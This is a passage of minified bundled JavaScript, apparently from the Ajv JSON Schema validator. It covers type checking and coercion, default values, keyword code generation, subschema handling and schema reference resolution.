0))}X.shouldUseRule=Y}),UW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.reportTypeError=X.checkDataTypes=X.checkDataType=X.coerceAndCheckDataType=X.getJSONTypes=X.getSchemaTypes=X.DataType=void 0;var Q=pN(),J=dN(),Y=LW(),W=V0(),G=D0(),H;(function(A){A[A.Correct=0]="Correct",A[A.Wrong=1]="Wrong"})(H||(X.DataType=H={}));function $(A){let O=z(A.type);if(O.includes("null")){if(A.nullable===!1)throw Error("type: null contradicts nullable: false")}else{if(!O.length&&A.nullable!==void 0)throw Error('"nullable" cannot be used without "type"');if(A.nullable===!0)O.push("null")}return O}X.getSchemaTypes=$;function z(A){let O=Array.isArray(A)?A:A?[A]:[];if(O.every(Q.isJSONType))return O;throw Error("type must be JSONType or JSONType[]: "+O.join(","))}X.getJSONTypes=z;function U(A,O){let{gen:w,data:N,opts:C}=A,_=B(O,C.coerceTypes),h=O.length>0&&!(_.length===0&&O.length===1&&(0,J.schemaHasRulesForType)(A,O[0]));if(h){let o=L(O,N,C.strictNumbers,H.Wrong);w.if(o,()=>{if(_.length)q(A,O,_);else j(A)})}return h}X.coerceAndCheckDataType=U;var K=new Set(["string","number","integer","boolean","null"]);function B(A,O){return O?A.filter((w)=>K.has(w)||O==="array"&&w==="array"):[]}function q(A,O,w){let{gen:N,data:C,opts:_}=A,h=N.let("dataType",W._`typeof ${C}`),o=N.let("coerced",W._`undefined`);if(_.coerceTypes==="array")N.if(W._`${h} == 'object' && Array.isArray(${C}) && ${C}.length == 1`,()=>N.assign(C,W._`${C}[0]`).assign(h,W._`typeof ${C}`).if(L(O,C,_.strictNumbers),()=>N.assign(o,C)));N.if(W._`${o} !== undefined`);for(let e of w)if(K.has(e)||e==="array"&&_.coerceTypes==="array")p(e);N.else(),j(A),N.endIf(),N.if(W._`${o} !== undefined`,()=>{N.assign(C,o),Z(A,o)});function p(e){switch(e){case"string":N.elseIf(W._`${h} == "number" || ${h} == "boolean"`).assign(o,W._`"" + ${C}`).elseIf(W._`${C} === null`).assign(o,W._`""`);return;case"number":N.elseIf(W._`${h} == "boolean" || ${C} === null
              || (${h} == "string" && ${C} && ${C} == +${C})`).assign(o,W._`+${C}`);return;case"integer":N.elseIf(W._`${h} === "boolean" || ${C} === null
              || (${h} === "string" && ${C} && ${C} == +${C} && !(${C} % 1))`).assign(o,W._`+${C}`);return;case"boolean":N.elseIf(W._`${C} === "false" || ${C} === 0 || ${C} === null`).assign(o,!1).elseIf(W._`${C} === "true" || ${C} === 1`).assign(o,!0);return;case"null":N.elseIf(W._`${C} === "" || ${C} === 0 || ${C} === false`),N.assign(o,null);return;case"array":N.elseIf(W._`${h} === "string" || ${h} === "number"
              || ${h} === "boolean" || ${C} === null`).assign(o,W._`[${C}]`)}}}function Z({gen:A,parentData:O,parentDataProperty:w},N){A.if(W._`${O} !== undefined`,()=>A.assign(W._`${O}[${w}]`,N))}function M(A,O,w,N=H.Correct){let C=N===H.Correct?W.operators.EQ:W.operators.NEQ,_;switch(A){case"null":return W._`${O} ${C} null`;case"array":_=W._`Array.isArray(${O})`;break;case"object":_=W._`${O} && typeof ${O} == "object" && !Array.isArray(${O})`;break;case"integer":_=h(W._`!(${O} % 1) && !isNaN(${O})`);break;case"number":_=h();break;default:return W._`typeof ${O} ${C} ${A}`}return N===H.Correct?_:(0,W.not)(_);function h(o=W.nil){return(0,W.and)(W._`typeof ${O} == "number"`,o,w?W._`isFinite(${O})`:W.nil)}}X.checkDataType=M;function L(A,O,w,N){if(A.length===1)return M(A[0],O,w,N);let C,_=(0,G.toHash)(A);if(_.array&&_.object){let h=W._`typeof ${O} != "object"`;C=_.null?h:W._`!${O} || ${h}`,delete _.null,delete _.array,delete _.object}else C=W.nil;if(_.number)delete _.integer;for(let h in _)C=(0,W.and)(C,M(h,O,w,N));return C}X.checkDataTypes=L;var R={message:({schema:A})=>`must be ${A}`,params:({schema:A,schemaValue:O})=>typeof A=="string"?W._`{type: ${A}}`:W._`{type: ${O}}`};function j(A){let O=F(A);(0,Y.reportError)(O,R)}X.reportTypeError=j;function F(A){let{gen:O,data:w,schema:N}=A,C=(0,G.schemaRefOrVal)(A,N,"type");return{gen:O,keyword:"type",data:w,schema:N.type,schemaCode:C,schemaValue:C,parentSchema:N,params:{},it:A}}}),wu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.assignDefaults=void 0;var Q=V0(),J=D0();function Y(G,H){let{properties:$,items:z}=G.schema;if(H==="object"&&$)for(let U in $)W(G,U,$[U].default);else if(H==="array"&&Array.isArray(z))z.forEach((U,K)=>W(G,K,U.default))}X.assignDefaults=Y;function W(G,H,$){let{gen:z,compositeRule:U,data:K,opts:B}=G;if($===void 0)return;let q=Q._`${K}${(0,Q.getProperty)(H)}`;if(U){(0,J.checkStrictMode)(G,`default is ignored for: ${q}`);return}let Z=Q._`${q} === undefined`;if(B.useDefaults==="empty")Z=Q._`${Z} || ${q} === null || ${q} === ""`;z.if(Z,Q._`${q} = ${(0,Q.stringify)($)}`)}}),x6=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.validateUnion=X.validateArray=X.usePattern=X.callValidateCode=X.schemaProperties=X.allSchemaProperties=X.noPropertyInData=X.propertyInData=X.isOwnProperty=X.hasPropFunc=X.reportMissingProp=X.checkMissingProp=X.checkReportMissingProp=void 0;var Q=V0(),J=D0(),Y=IX(),W=D0();function G(A,O){let{gen:w,data:N,it:C}=A;w.if(B(w,N,O,C.opts.ownProperties),()=>{A.setParams({missingProperty:Q._`${O}`},!0),A.error()})}X.checkReportMissingProp=G;function H({gen:A,data:O,it:{opts:w}},N,C){return(0,Q.or)(...N.map((_)=>(0,Q.and)(B(A,O,_,w.ownProperties),Q._`${C} = ${_}`)))}X.checkMissingProp=H;function $(A,O){A.setParams({missingProperty:O},!0),A.error()}X.reportMissingProp=$;function z(A){return A.scopeValue("func",{ref:Object.prototype.hasOwnProperty,code:Q._`Object.prototype.hasOwnProperty`})}X.hasPropFunc=z;function U(A,O,w){return Q._`${z(A)}.call(${O}, ${w})`}X.isOwnProperty=U;function K(A,O,w,N){let C=Q._`${O}${(0,Q.getProperty)(w)} !== undefined`;return N?Q._`${C} && ${U(A,O,w)}`:C}X.propertyInData=K;function B(A,O,w,N){let C=Q._`${O}${(0,Q.getProperty)(w)} === undefined`;return N?(0,Q.or)(C,(0,Q.not)(U(A,O,w))):C}X.noPropertyInData=B;function q(A){return A?Object.keys(A).filter((O)=>O!=="__proto__"):[]}X.allSchemaProperties=q;function Z(A,O){return q(O).filter((w)=>!(0,J.alwaysValidSchema)(A,O[w]))}X.schemaProperties=Z;function M({schemaCode:A,data:O,it:{gen:w,topSchemaRef:N,schemaPath:C,errorPath:_},it:h},o,p,e){let d=e?Q._`${A}, ${O}, ${N}${C}`:O,Q1=[[Y.default.instancePath,(0,Q.strConcat)(Y.default.instancePath,_)],[Y.default.parentData,h.parentData],[Y.default.parentDataProperty,h.parentDataProperty],[Y.default.rootData,Y.default.rootData]];if(h.opts.dynamicRef)Q1.push([Y.default.dynamicAnchors,Y.default.dynamicAnchors]);let V1=Q._`${d}, ${w.object(...Q1)}`;return p!==Q.nil?Q._`${o}.call(${p}, ${V1})`:Q._`${o}(${V1})`}X.callValidateCode=M;var L=Q._`new RegExp`;function R({gen:A,it:{opts:O}},w){let N=O.unicodeRegExp?"u":"",{regExp:C}=O.code,_=C(w,N);return A.scopeValue("pattern",{key:_.toString(),ref:_,code:Q._`${C.code==="new RegExp"?L:(0,W.useFunc)(A,C)}(${w}, ${N})`})}X.usePattern=R;function j(A){let{gen:O,data:w,keyword:N,it:C}=A,_=O.name("valid");if(C.allErrors){let o=O.let("valid",!0);return h(()=>O.assign(o,!1)),o}return O.var(_,!0),h(()=>O.break()),_;function h(o){let p=O.const("len",Q._`${w}.length`);O.forRange("i",0,p,(e)=>{A.subschema({keyword:N,dataProp:e,dataPropType:J.Type.Num},_),O.if((0,Q.not)(_),o)})}}X.validateArray=j;function F(A){let{gen:O,schema:w,keyword:N,it:C}=A;if(!Array.isArray(w))throw Error("ajv implementation error");if(w.some((p)=>(0,J.alwaysValidSchema)(C,p))&&!C.opts.unevaluated)return;let h=O.let("valid",!1),o=O.name("_valid");O.block(()=>w.forEach((p,e)=>{let d=A.subschema({keyword:N,schemaProp:e,compositeRule:!0},o);if(O.assign(h,Q._`${h} || ${o}`),!A.mergeValidEvaluated(d,o))O.if((0,Q.not)(h))})),A.result(h,()=>A.reset(),()=>A.error(!0))}X.validateUnion=F}),Iu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.validateKeywordUsage=X.validSchemaType=X.funcKeywordCode=X.macroKeywordCode=void 0;var Q=V0(),J=IX(),Y=x6(),W=LW();function G(Z,M){let{gen:L,keyword:R,schema:j,parentSchema:F,it:A}=Z,O=M.macro.call(A.self,j,F,A),w=K(L,R,O);if(A.opts.validateSchema!==!1)A.self.validateSchema(O,!0);let N=L.name("valid");Z.subschema({schema:O,schemaPath:Q.nil,errSchemaPath:`${A.errSchemaPath}/${R}`,topSchemaRef:w,compositeRule:!0},N),Z.pass(N,()=>Z.error(!0))}X.macroKeywordCode=G;function H(Z,M){var L;let{gen:R,keyword:j,schema:F,parentSchema:A,$data:O,it:w}=Z;U(w,M);let N=!O&&M.compile?M.compile.call(w.self,F,A,w):M.validate,C=K(R,j,N),_=R.let("valid");Z.block$data(_,h),Z.ok((L=M.valid)!==null&&L!==void 0?L:_);function h(){if(M.errors===!1){if(e(),M.modifying)$(Z);d(()=>Z.error())}else{let Q1=M.async?o():p();if(M.modifying)$(Z);d(()=>z(Z,Q1))}}function o(){let Q1=R.let("ruleErrs",null);return R.try(()=>e(Q._`await `),(V1)=>R.assign(_,!1).if(Q._`${V1} instanceof ${w.ValidationError}`,()=>R.assign(Q1,Q._`${V1}.errors`),()=>R.throw(V1))),Q1}function p(){let Q1=Q._`${C}.errors`;return R.assign(Q1,null),e(Q.nil),Q1}function e(Q1=M.async?Q._`await `:Q.nil){let V1=w.opts.passContext?J.default.this:J.default.self,D1=!(("compile"in M)&&!O||M.schema===!1);R.assign(_,Q._`${Q1}${(0,Y.callValidateCode)(Z,C,V1,D1)}`,M.modifying)}function d(Q1){var V1;R.if((0,Q.not)((V1=M.valid)!==null&&V1!==void 0?V1:_),Q1)}}X.funcKeywordCode=H;function $(Z){let{gen:M,data:L,it:R}=Z;M.if(R.parentData,()=>M.assign(L,Q._`${R.parentData}[${R.parentDataProperty}]`))}function z(Z,M){let{gen:L}=Z;L.if(Q._`Array.isArray(${M})`,()=>{L.assign(J.default.vErrors,Q._`${J.default.vErrors} === null ? ${M} : ${J.default.vErrors}.concat(${M})`).assign(J.default.errors,Q._`${J.default.vErrors}.length`),(0,W.extendErrors)(Z)},()=>Z.error())}function U({schemaEnv:Z},M){if(M.async&&!Z.$async)throw Error("async keyword in sync schema")}function K(Z,M,L){if(L===void 0)throw Error(`keyword "${M}" failed to compile`);return Z.scopeValue("keyword",typeof L=="function"?{ref:L}:{ref:L,code:(0,Q.stringify)(L)})}function B(Z,M,L=!1){return!M.length||M.some((R)=>R==="array"?Array.isArray(Z):R==="object"?Z&&typeof Z=="object"&&!Array.isArray(Z):typeof Z==R||L&&typeof Z>"u")}X.validSchemaType=B;function q({schema:Z,opts:M,self:L,errSchemaPath:R},j,F){if(Array.isArray(j.keyword)?!j.keyword.includes(F):j.keyword!==F)throw Error("ajv implementation error");let A=j.dependencies;if(A===null||A===void 0?void 0:A.some((O)=>!Object.prototype.hasOwnProperty.call(Z,O)))throw Error(`parent schema must have dependencies of ${F}: ${A.join(",")}`);if(j.validateSchema){if(!j.validateSchema(Z[F])){let w=`keyword "${F}" value is invalid at path "${R}": `+L.errorsText(j.validateSchema.errors);if(M.validateSchema==="log")L.logger.error(w);else throw Error(w)}}}X.validateKeywordUsage=q}),Cu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.extendSubschemaMode=X.extendSubschemaData=X.getSubschema=void 0;var Q=V0(),J=D0();function Y(H,{keyword:$,schemaProp:z,schema:U,schemaPath:K,errSchemaPath:B,topSchemaRef:q}){if($!==void 0&&U!==void 0)throw Error('both "keyword" and "schema" passed, only one allowed');if($!==void 0){let Z=H.schema[$];return z===void 0?{schema:Z,schemaPath:Q._`${H.schemaPath}${(0,Q.getProperty)($)}`,errSchemaPath:`${H.errSchemaPath}/${$}`}:{schema:Z[z],schemaPath:Q._`${H.schemaPath}${(0,Q.getProperty)($)}${(0,Q.getProperty)(z)}`,errSchemaPath:`${H.errSchemaPath}/${$}/${(0,J.escapeFragment)(z)}`}}if(U!==void 0){if(K===void 0||B===void 0||q===void 0)throw Error('"schemaPath", "errSchemaPath" and "topSchemaRef" are required with "schema"');return{schema:U,schemaPath:K,topSchemaRef:q,errSchemaPath:B}}throw Error('either "keyword" or "schema" must be passed')}X.getSubschema=Y;function W(H,$,{dataProp:z,dataPropType:U,data:K,dataTypes:B,propertyName:q}){if(K!==void 0&&z!==void 0)throw Error('both "data" and "dataProp" passed, only one allowed');let{gen:Z}=$;if(z!==void 0){let{errorPath:L,dataPathArr:R,opts:j}=$,F=Z.let("data",Q._`${$.data}${(0,Q.getProperty)(z)}`,!0);M(F),H.errorPath=Q.str`${L}${(0,J.getErrorPath)(z,U,j.jsPropertySyntax)}`,H.parentDataProperty=Q._`${z}`,H.dataPathArr=[...R,H.parentDataProperty]}if(K!==void 0){let L=K instanceof Q.Name?K:Z.let("data",K,!0);if(M(L),q!==void 0)H.propertyName=q}if(B)H.dataTypes=B;function M(L){H.data=L,H.dataLevel=$.dataLevel+1,H.dataTypes=[],$.definedProperties=new Set,H.parentData=$.data,H.dataNames=[...$.dataNames,L]}}X.extendSubschemaData=W;function G(H,{jtdDiscriminator:$,jtdMetadata:z,compositeRule:U,createErrors:K,allErrors:B}){if(U!==void 0)H.compositeRule=U;if(K!==void 0)H.createErrors=K;if(B!==void 0)H.allErrors=B;H.jtdDiscriminator=$,H.jtdMetadata=z}X.extendSubschemaMode=G}),iN=S1((X,Q)=>{Q.exports=function J(Y,W){if(Y===W)return!0;if(Y&&W&&typeof Y=="object"&&typeof W=="object"){if(Y.constructor!==W.constructor)return!1;var G,H,$;if(Array.isArray(Y)){if(G=Y.length,G!=W.length)return!1;for(H=G;H--!==0;)if(!J(Y[H],W[H]))return!1;return!0}if(Y.constructor===RegExp)return Y.source===W.source&&Y.flags===W.flags;if(Y.valueOf!==Object.prototype.valueOf)return Y.valueOf()===W.valueOf();if(Y.toString!==Object.prototype.toString)return Y.toString()===W.toString();if($=Object.keys(Y),G=$.length,G!==Object.keys(W).length)return!1;for(H=G;H--!==0;)if(!Object.prototype.hasOwnProperty.call(W,$[H]))return!1;for(H=G;H--!==0;){var z=$[H];if(!J(Y[z],W[z]))return!1}return!0}return Y!==Y&&W!==W}}),Pu1=S1((X,Q)=>{var J=Q.exports=function(G,H,$){if(typeof H=="function")$=H,H={};$=H.cb||$;var z=typeof $=="function"?$:$.pre||function(){},U=$.post||function(){};Y(H,z,U,G,"",G)};J.keywords={additionalItems:!0,items:!0,contains:!0,additionalProperties:!0,propertyNames:!0,not:!0,if:!0,then:!0,else:!0},J.arrayKeywords={items:!0,allOf:!0,anyOf:!0,oneOf:!0},J.propsKeywords={$defs:!0,definitions:!0,properties:!0,patternProperties:!0,dependencies:!0},J.skipKeywords={default:!0,enum:!0,const:!0,required:!0,maximum:!0,minimum:!0,exclusiveMaximum:!0,exclusiveMinimum:!0,multipleOf:!0,maxLength:!0,minLength:!0,pattern:!0,format:!0,maxItems:!0,minItems:!0,uniqueItems:!0,maxProperties:!0,minProperties:!0};function Y(G,H,$,z,U,K,B,q,Z,M){if(z&&typeof z=="object"&&!Array.isArray(z)){H(z,U,K,B,q,Z,M);for(var L in z){var R=z[L];if(Array.isArray(R)){if(L in J.arrayKeywords)for(var j=0;j<R.length;j++)Y(G,H,$,R[j],U+"/"+L+"/"+j,K,U,L,z,j)}else if(L in J.propsKeywords){if(R&&typeof R=="object")for(var F in R)Y(G,H,$,R[F],U+"/"+L+"/"+W(F),K,U,L,z,F)}else if(L in J.keywords||G.allKeys&&!(L in J.skipKeywords))Y(G,H,$,R,U+"/"+L,K,U,L,z)}$(z,U,K,B,q,Z,M)}}function W(G){return G.replace(/~/g,"~0").replace(/\//g,"~1")}}),DW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.getSchemaRefs=X.resolveUrl=X.normalizeId=X._getFullPath=X.getFullPath=X.inlineRef=void 0;var Q=D0(),J=iN(),Y=Pu1(),W=new Set(["type","format","pattern","maxLength","minLength","maxProperties","minProperties","maxItems","minItems","maximum","minimum","uniqueItems","multipleOf","required","enum","const"]);function G(R,j=!0){if(typeof R=="boolean")return!0;if(j===!0)return!$(R);if(!j)return!1;return z(R)<=j}X.inlineRef=G;var H=new Set(["$ref","$recursiveRef","$recursiveAnchor","$dynamicRef","$dynamicAnchor"]);function $(R){for(let j in R){if(H.has(j))return!0;let F=R[j];if(Array.isArray(F)&&F.some($))return!0;if(typeof F=="object"&&$(F))return!0}return!1}function z(R){let j=0;for(let F in R){if(F==="$ref")return 1/0;if(j++,W.has(F))continue;if(typeof R[F]=="object")(0,Q.eachItem)(R[F],(A)=>j+=z(A));if(j===1/0)return 1/0}return j}function U(R,j="",F){if(F!==!1)j=q(j);let A=R.parse(j);return K(R,A)}X.getFullPath=U;function K(R,j){return R.serialize(j).split("#")[0]+"#"}X._getFullPath=K;var B=/#\/?$/;function q(R){return R?R.replace(B,""):""}X.normalizeId=q;function Z(R,j,F){return F=q(F),R.resolve(j,F)}X.resolveUrl=Z;var M=/^[a-z_][-a-z0-9._]*$/i;function L(R,j){if(typeof R=="boolean")return{};let{schemaId:F,uriResolver:A}=this.opts,O=q(R[F]||j),w={"":O},N=U(A,O,!1),C={},_=new Set;return Y(R,{allKeys:!0},(p,e,d,Q1)=>{if(Q1===void 0)return;let V1=N+e,D1=w[Q1];if(typeof p[F]=="string")D1=n.call(this,p[F]);t.call(this,p.$anchor),t.call(this,p.$dynamicAnchor),w[e]=D1;function n(u){let E=this.opts.uriResolver.resolve;if(u=q(D1?E(D1,u):u),_.has(u))throw o(u);_.add(u);let y=this.refs[u];if(typeof y=="string")y=this.refs[y];if(typeof y=="object")h(p,y.schema,u);else if(u!==q(V1))if(u[0]==="#")h(p,C[u],u),C[u]=p;else this.refs[u]=V1;return u}function t(u){if(typeof u=="string"){if(!M.test(u))throw Error(`invalid anchor "${u}"`);n.call(this,`#${u}`)}}}),C;function h(p,e,d){if(e!==void 0&&!J(p,e))throw o(d)}function o(p){return Error(`reference "${p}" resolves to more than one schema`)}}X.getSchemaRefs=L}),NW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.getData=X.KeywordCxt=X.validateFunctionCode=void 0;var Q=Nu1(),J=UW(),Y=dN(),W=UW(),G=wu1(),H=Iu1(),$=Cu1(),z=V0(),U=IX(),K=DW(),B=D0(),q=LW();function Z(k){if(N(k)){if(_(k),w(k)){j(k);return}}M(k,()=>(0,Q.topBoolOrEmptySchema)(k))}X.validateFunctionCode=Z;function M({gen:k,validateName:c,schema:X1,schemaEnv:N1,opts:r},s){if(r.code.es5)k.func(c,z._`${U.default.data}, ${U.default.valCxt}`,N1.$async,()=>{k.code(z._`"use strict"; ${A(X1,r)}`),R(k,r),k.code(s)});else k.func(c,z._`${U.default.data}, ${L(r)}`,N1.$async,()=>k.code(A(X1,r)).code(s))}function L(k){return z._`{${U.default.instancePath}="", ${U.default.parentData}, ${U.default.parentDataProperty}, ${U.default.rootData}=${U.default.data}${k.dynamicRef?z._`, ${U.default.dynamicAnchors}={}`:z.nil}}={}`}function R(k,c){k.if(U.default.valCxt,()=>{if(k.var(U.default.instancePath,z._`${U.default.valCxt}.${U.default.instancePath}`),k.var(U.default.parentData,z._`${U.default.valCxt}.${U.default.parentData}`),k.var(U.default.parentDataProperty,z._`${U.default.valCxt}.${U.default.parentDataProperty}`),k.var(U.default.rootData,z._`${U.default.valCxt}.${U.default.rootData}`),c.dynamicRef)k.var(U.default.dynamicAnchors,z._`${U.default.valCxt}.${U.default.dynamicAnchors}`)},()=>{if(k.var(U.default.instancePath,z._`""`),k.var(U.default.parentData,z._`undefined`),k.var(U.default.parentDataProperty,z._`undefined`),k.var(U.default.rootData,U.default.data),c.dynamicRef)k.var(U.default.dynamicAnchors,z._`{}`)})}function j(k){let{schema:c,opts:X1,gen:N1}=k;M(k,()=>{if(X1.$comment&&c.$comment)Q1(k);if(p(k),N1.let(U.default.vErrors,null),N1.let(U.default.errors,0),X1.unevaluated)F(k);h(k),V1(k)});return}function F(k){let{gen:c,validateName:X1}=k;k.evaluated=c.const("evaluated",z._`${X1}.evaluated`),c.if(z._`${k.evaluated}.dynamicProps`,()=>c.assign(z._`${k.evaluated}.props`,z._`undefined`)),c.if(z._`${k.evaluated}.dynamicItems`,()=>c.assign(z._`${k.evaluated}.items`,z._`undefined`))}function A(k,c){let X1=typeof k=="object"&&k[c.schemaId];return X1&&(c.code.source||c.code.process)?z._`/*# sourceURL=${X1} */`:z.nil}function O(k,c){if(N(k)){if(_(k),w(k)){C(k,c);return}}(0,Q.boolOrEmptySchema)(k,c)}function w({schema:k,self:c}){if(typeof k=="boolean")return!k;for(let X1 in k)if(c.RULES.all[X1])return!0;return!1}function N(k){return typeof k.schema!="boolean"}function C(k,c){let{schema:X1,gen:N1,opts:r}=k;if(r.$comment&&X1.$comment)Q1(k);e(k),d(k);let s=N1.const("_errs",U.default.errors);h(k,s),N1.var(c,z._`${s} === ${U.default.errors}`)}function _(k){(0,B.checkUnknownRules)(k),o(k)}function h(k,c){if(k.opts.jtd)return n(k,[],!1,c);let X1=(0,J.getSchemaTypes)(k.schema),N1=(0,J.coerceAndCheckDataType)(k,X1);n(k,X1,!N1,c)}function o(k){let{schema:c,errSchemaPath:X1,opts:N1,self:r}=k;if(c.$ref&&N1.ignoreKeywordsWithRef&&(0,B.schemaHasRulesButRef)(c,r.RULES))r.logger.warn(`$ref: keywords ignored in schema at path "${X1}"`)}function p(k){let{schema:c,opts:X1}=k;if(c.default!==void 0&&X1.useDefaults&&X1.strictSchema)(0,B.checkStrictMode)(k,"default is ignored in the schema root")}function e(k){let c=k.schema[k.opts.schemaId];if(c)k.baseId=(0,K.resolveUrl)(k.opts.uriResolver,k.baseId,c)}function d(k){if(k.schema.$async&&!k.schemaEnv.$async)throw Error("async schema in sync schema")}function Q1({gen:k,schemaEnv:c,schema:X1,errSchemaPath:N1,opts:r}){let s=X1.$comment;if(r.$comment===!0)k.code(z._`${U.default.self}.logger.log(${s})`);else if(typeof r.$comment=="function"){let M1=z.str`${N1}/$comment`,w1=k.scopeValue("root",{ref:c.root});k.code(z._`${U.default.self}.opts.$comment(${s}, ${M1}, ${w1}.schema)`)}}function V1(k){let{gen:c,schemaEnv:X1,validateName:N1,ValidationError:r,opts:s}=k;if(X1.$async)c.if(z._`${U.default.errors} === 0`,()=>c.return(U.default.data),()=>c.throw(z._`new ${r}(${U.default.vErrors})`));else{if(c.assign(z._`${N1}.errors`,U.default.vErrors),s.unevaluated)D1(k);c.return(z._`${U.default.errors} === 0`)}}function D1({gen:k,evaluated:c,props:X1,items:N1}){if(X1 instanceof z.Name)k.assign(z._`${c}.props`,X1);if(N1 instanceof z.Name)k.assign(z._`${c}.items`,N1)}function n(k,c,X1,N1){let{gen:r,schema:s,data:M1,allErrors:w1,opts:i1,self:u1}=k,{RULES:o1}=u1;if(s.$ref&&(i1.ignoreKeywordsWithRef||!(0,B.schemaHasRulesButRef)(s,o1))){r.block(()=>P1(k,"$ref",o1.all.$ref.definition));return}if(!i1.jtd)u(k,c);r.block(()=>{for(let b0 of o1.rules)k0(b0);k0(o1.post)});function k0(b0){if(!(0,Y.shouldUseGroup)(s,b0))return;if(b0.type){if(r.if((0,W.checkDataType)(b0.type,M1,i1.strictNumbers)),t(k,b0),c.length===1&&c[0]===b0.type&&X1)r.else(),(0,W.reportTypeError)(k);r.endIf()}else t(k,b0);if(!w1)r.if(z._`${U.default.errors} === ${N1||0}`)}}function t(k,c){let{gen:X1,schema:N1,opts:{useDefaults:r}}=k;if(r)(0,G.assignDefaults)(k,c.type);X1.block(()=>{for(let s of c.rules)if((0,Y.shouldUseRule)(N1,s))P1(k,s.keyword,s.definition,c.type)})}function u(k,c){if(k.schemaEnv.meta||!k.opts.strictTypes)return;if(E(k,c),!k.opts.allowUnionTypes)y(k,c);a(k,k.dataTypes)}function E(k,c){if(!c.length)return;if(!k.dataTypes.length){k.dataTypes=c;return}c.forEach((X1)=>{if(!v(k.dataTypes,X1))H1(k,`type "${X1}" not allowed by context "${k.dataTypes.join(",")}"`)}),g(k,c)}function y(k,c){if(c.length>1&&!(c.length===2&&c.includes("null")))H1(k,"use allowUnionTypes to allow union type keyword")}function a(k,c){let X1=k.self.RULES.all;for(let N1 in X1){let r=X1[N1];if(typeof r=="object"&&(0,Y.shouldUseRule)(k.schema,r)){let{type:s}=r.definition;if(s.length&&!s.some((M1)=>I(c,M1)))H1(k,`missing type "${s.join(",")}" for keyword "${N1}"`)}}}function I(k,c){return k.includes(c)||c==="number"&&k.includes("integer")}function v(k,c){return k.includes(c)||c==="integer"&&k.includes("number")}function g(k,c){let X1=[];for(let N1 of k.dataTypes)if(v(c,N1))X1.push(N1);else if(c.includes("integer")&&N1==="number")X1.push("integer");k.dataTypes=X1}function H1(k,c){let X1=k.schemaEnv.baseId+k.errSchemaPath;c+=` at "${X1}" (strictTypes)`,(0,B.checkStrictMode)(k,c,k.opts.strictTypes)}class z1{constructor(k,c,X1){if((0,H.validateKeywordUsage)(k,c,X1),this.gen=k.gen,this.allErrors=k.allErrors,this.keyword=X1,this.data=k.data,this.schema=k.schema[X1],this.$data=c.$data&&k.opts.$data&&this.schema&&this.schema.$data,this.schemaValue=(0,B.schemaRefOrVal)(k,this.schema,X1,this.$data),this.schemaType=c.schemaType,this.parentSchema=k.schema,this.params={},this.it=k,this.def=c,this.$data)this.schemaCode=k.gen.const("vSchema",Y1(this.$data,k));else if(this.schemaCode=this.schemaValue,!(0,H.validSchemaType)(this.schema,c.schemaType,c.allowUndefined))throw Error(`${X1} value must be ${JSON.stringify(c.schemaType)}`);if("code"in c?c.trackErrors:c.errors!==!1)this.errsCount=k.gen.const("_errs",U.default.errors)}result(k,c,X1){this.failResult((0,z.not)(k),c,X1)}failResult(k,c,X1){if(this.gen.if(k),X1)X1();else this.error();if(c){if(this.gen.else(),c(),this.allErrors)this.gen.endIf()}else if(this.allErrors)this.gen.endIf();else this.gen.else()}pass(k,c){this.failResult((0,z.not)(k),void 0,c)}fail(k){if(k===void 0){if(this.error(),!this.allErrors)this.gen.if(!1);return}if(this.gen.if(k),this.error(),this.allErrors)this.gen.endIf();else this.gen.else()}fail$data(k){if(!this.$data)return this.fail(k);let{schemaCode:c}=this;this.fail(z._`${c} !== undefined && (${(0,z.or)(this.invalid$data(),k)})`)}error(k,c,X1){if(c){this.setParams(c),this._error(k,X1),this.setParams({});return}this._error(k,X1)}_error(k,c){(k?q.reportExtraError:q.reportError)(this,this.def.error,c)}$dataError(){(0,q.reportError)(this,this.def.$dataError||q.keyword$DataError)}reset(){if(this.errsCount===void 0)throw Error('add "trackErrors" to keyword definition');(0,q.resetErrorsCount)(this.gen,this.errsCount)}ok(k){if(!this.allErrors)this.gen.if(k)}setParams(k,c){if(c)Object.assign(this.params,k);else this.params=k}block$data(k,c,X1=z.nil){this.gen.block(()=>{this.check$data(k,X1),c()})}check$data(k=z.nil,c=z.nil){if(!this.$data)return;let{gen:X1,schemaCode:N1,schemaType:r,def:s}=this;if(X1.if((0,z.or)(z._`${N1} === undefined`,c)),k!==z.nil)X1.assign(k,!0);if(r.length||s.validateSchema){if(X1.elseIf(this.invalid$data()),this.$dataError(),k!==z.nil)X1.assign(k,!1)}X1.else()}invalid$data(){let{gen:k,schemaCode:c,schemaType:X1,def:N1,it:r}=this;return(0,z.or)(s(),M1());function s(){if(X1.length){if(!(c instanceof z.Name))throw Error("ajv implementation error");let w1=Array.isArray(X1)?X1:[X1];return z._`${(0,W.checkDataTypes)(w1,c,r.opts.strictNumbers,W.DataType.Wrong)}`}return z.nil}function M1(){if(N1.validateSchema){let w1=k.scopeValue("validate$data",{ref:N1.validateSchema});return z._`!${w1}(${c})`}return z.nil}}subschema(k,c){let X1=(0,$.getSubschema)(this.it,k);(0,$.extendSubschemaData)(X1,this.it,k),(0,$.extendSubschemaMode)(X1,k);let N1={...this.it,...X1,items:void 0,props:void 0};return O(N1,c),N1}mergeEvaluated(k,c){let{it:X1,gen:N1}=this;if(!X1.opts.unevaluated)return;if(X1.props!==!0&&k.props!==void 0)X1.props=B.mergeEvaluated.props(N1,k.props,X1.props,c);if(X1.items!==!0&&k.items!==void 0)X1.items=B.mergeEvaluated.items(N1,k.items,X1.items,c)}mergeValidEvaluated(k,c){let{it:X1,gen:N1}=this;if(X1.opts.unevaluated&&(X1.props!==!0||X1.items!==!0))return N1.if(c,()=>this.mergeEvaluated(k,z.Name)),!0}}X.KeywordCxt=z1;function P1(k,c,X1,N1){let r=new z1(k,X1,c);if("code"in X1)X1.code(r,N1);else if(r.$data&&X1.validate)(0,H.funcKeywordCode)(r,X1);else if("macro"in X1)(0,H.macroKeywordCode)(r,X1);else if(X1.compile||X1.validate)(0,H.funcKeywordCode)(r,X1)}var j1=/^\/(?:[^~]|~0|~1)*$/,k1=/^([0-9]+)(#|\/(?:[^~]|~0|~1)*)?$/;function Y1(k,{dataLevel:c,dataNames:X1,dataPathArr:N1}){let r,s;if(k==="")return 